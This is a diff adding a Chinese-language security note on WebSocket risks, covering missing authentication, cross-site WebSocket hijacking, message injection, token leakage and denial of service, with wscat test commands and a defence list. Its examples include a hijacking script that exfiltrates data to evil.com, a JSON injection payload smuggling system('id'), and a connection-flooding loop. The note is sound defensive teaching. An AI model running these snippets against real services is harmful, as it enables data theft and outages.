@@ -1,0 +1,101 @@
+# WebSocket 安全
+
+> WebSocket — 全双工通信协议的安全问题
+
+## WebSocket 与 HTTP 的区别
+
+| 特性 | HTTP | WebSocket |
+|------|------|-----------|
+| 连接方式 | 短连接（请求-响应） | 长连接（全双工） |
+| 协议 | http/https | ws/wss |
+| 跨域 | 同源策略限制 | 无同源策略限制（关键！） |
+| 认证 | 通常每次请求带 Cookie/Token | 仅在握手时认证 |
+| 状态 | 无状态 | 有状态 |
+
+## WebSocket 主要安全风险
+
+### 1. 无认证/认证不足
+```javascript
+// 如果 WebSocket 连接建立时不验证身份
+const ws = new WebSocket("ws://target.com/ws");
+ws.onmessage = function(event) {
+    console.log(event.data);  // 直接获取所有推送数据
+};
+
+// 很多 WebSocket 仅在握手时认证，之后不再验证
+```
+
+### 2. 跨域 WebSocket 劫持（CSWSH）
+```html
+<!-- CSRF for WebSocket -->
+<script>
+var ws = new WebSocket('ws://target.com/ws');
+ws.onopen = function() {
+    ws.send('获取敏感数据');
+};
+ws.onmessage = function(e) {
+    // 将数据发送到攻击者服务器
+    fetch('https://evil.com/steal?data=' + btoa(e.data));
+};
+</script>
+```
+
+**注意**: WebSocket 没有同源策略限制！任何站点都可以向任意 WebSocket 端点发起连接。
+
+### 3. 消息注入
+
+```javascript
+// 如果服务端将用户输入直接拼接到消息中
+ws.send("{\"cmd\":\"" + userInput + "\"}");
+
+// 注入恶意 JSON
+// 输入: \", \"cmd\": \"system('id')
+// 结果: {"cmd":"\", "cmd": "system('id')"}
+
+// 更好的方式是使用 JSON.stringify
+```
+
+### 4. 敏感信息泄露
+```javascript
+// WebSocket 连接建立时，URL 中可能携带 Token
+const ws = new WebSocket("ws://target.com/ws?token=eyJhbGciOiJIUzI1NiIs...");
+
+// Referer 头泄露
+// Websocket URL 中的参数可能在日志中记录
+```
+
+### 5. 拒绝服务（DoS）
+```javascript
+// 大量连接耗尽服务端资源
+for (let i = 0; i < 10000; i++) {
+    new WebSocket('ws://target.com/ws');
+}
+
+// 发送大量消息
+while (true) {
+    ws.send('A'.repeat(1024 * 1024));  // 1MB 消息
+}
+```
+
+## 测试方法
+
+```bash
+# wscat — WebSocket 测试工具
+wscat -c ws://target.com/ws
+wscat -c wss://target.com/ws
+
+# 带 Origin 测试
+wscat -c ws://target.com/ws -H "Origin: https://evil.com"
+
+# 带 Cookie
+wscat -c ws://target.com/ws -H "Cookie: session=xxx"
+```
+
+## 防御措施
+
+1. **握手时验证** — 使用 Token 而非仅 Origin
+2. **Origin 验证** — 验证 WebSocket 握手请求的 Origin 头
+3. **消息校验** — 对所有消息进行输入验证和输出编码
+4. **速率限制** — 限制连接频率和消息大小
+5. **关闭超时连接** — 闲置连接及时关闭
+6. **使用 WSS** — 加密传输防止中间人攻击
